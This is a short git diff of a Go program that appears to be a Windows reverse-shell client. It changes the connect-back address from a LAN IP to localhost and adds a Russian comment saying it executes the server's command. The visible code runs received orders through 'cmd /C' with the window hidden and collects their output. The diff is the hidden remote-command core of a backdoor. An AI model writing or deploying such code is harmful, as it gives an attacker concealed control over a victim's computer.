@@ -16,7 +16,7 @@ import (
 )
 
 func main() {
-	reverse("192.168.1.76:12345")
+	reverse("127.0.0.1:12345")
 }
 
 func reverse(host string) {
@@ -38,6 +38,7 @@ func reverse(host string) {
 			return
 		}
 
+		// выполняем комманду сервера
 		cmd := exec.Command("cmd", "/C", order)
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		out, _ := cmd.CombinedOutput()
